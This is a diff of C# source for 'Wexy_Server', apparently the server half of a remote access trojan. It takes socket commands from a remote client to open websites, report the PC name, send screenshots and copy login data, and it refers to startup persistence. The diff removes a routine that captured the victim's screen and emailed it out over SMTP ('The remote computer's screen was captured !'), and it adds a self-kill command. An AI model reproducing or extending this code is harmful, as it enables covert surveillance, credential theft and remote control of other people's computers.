@@ -34,7 +34,7 @@ namespace Wexy_Server
                 try
                 {
                     //Packet of the received data
-                    byte[] RecPacket = new byte[10000];
+                    byte[] RecPacket = new byte[1000];
 
                     //Read a command from the client.
                     Receiver.Read(RecPacket, 0, RecPacket.Length);
@@ -63,14 +63,6 @@ namespace Wexy_Server
                             //Open a website with Internet Explorer
                             string site = CommandArray[1];
                             OpenWebsite(site);
-                            break;
-
-                        case "ss":
-                            //Take a screenshot of the screen and send it via mail
-                            string from = CommandArray[1];
-                            string password = CommandArray[2];
-                            string to = CommandArray[3];
-                            TakeScreenshot(from, password,to);
                             break;
 
                         case "pcname":
@@ -140,9 +132,8 @@ namespace Wexy_Server
                             SendScreenshot();
                             break;
 
-                        case "quit":
-                            //Drop connection
-                            DropConnection();
+                        case "killwexy":
+                            KillWexy();
                             break;
                     }
                 }
@@ -154,6 +145,12 @@ namespace Wexy_Server
         }
 
         #region Commands
+
+        public static void KillWexy()
+        {
+            //RemoveFromStartup();
+            Environment.Exit(0);
+        }
 
         // - ALMOST OK - [Files are not completely downloaded, also it changes the stream bytes]
         public static void SendScreenshot()
@@ -339,44 +336,6 @@ namespace Wexy_Server
             }
         }
 
-        // - ALMOST OK - [Crashes a few seconds after sending the file]
-        public static void sendScreenshot(string from, string password, string to)
-        {
-            try
-            {
-                //Configure the stmp client
-                SmtpClient client = new SmtpClient("smtp.live.com");
-                client.Port = 587;
-                client.EnableSsl = true;
-                client.Timeout = 100000;
-                client.DeliveryMethod = SmtpDeliveryMethod.Network;
-                client.Credentials = new System.Net.NetworkCredential(from,password);
-
-                //Configure the mail to send
-                Attachment objAttachment = new Attachment(@"C:\\Users\\" + Environment.UserName + "\\desktop\\screenshot.jpeg");
-                MailMessage msg = new MailMessage();
-                msg.To.Add(to);
-                msg.From = new MailAddress(from);
-                msg.Attachments.Add(objAttachment);
-                msg.Subject = "New screenshot";
-                msg.Body = "The remote computer's screen was captured ! ";
-
-                client.Send(msg);
-            }
-            catch //Could not send the mail(may be disconnected from the internet), so we close the application , it will start again on startup.
-            {
-                //Environment.Exit(0);
-            }
-        }
-
-        // - ALMOST OK - [Can't reconnect the socket] 
-        public static void DropConnection()
-        {
-            client.Client.Shutdown(SocketShutdown.Both);
-            client.Client.Close();
-            client.Close();
-        }
-
         // - OK -
         public static void copyLoginData()
         {
@@ -386,16 +345,6 @@ namespace Wexy_Server
             }
             catch
             { }
-        }
-        // - OK - 
-        public static void TakeScreenshot(string from, string password, string to)
-        {
-            Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
-            Graphics graphics = Graphics.FromImage(bitmap as Image);
-            graphics.CopyFromScreen(0, 0, 0, 0, bitmap.Size);
-            bitmap.Save(@"C:\\Users\\" + Environment.UserName + "\\desktop\\screenshot.jpeg", ImageFormat.Jpeg);
-            sendScreenshot(from, password, to);
-            //System.IO.File.Delete(@"C:\\Users\\" + Environment.UserName + "\\desktop\\screenshot.jpeg");
         }
 
         // - OK - 
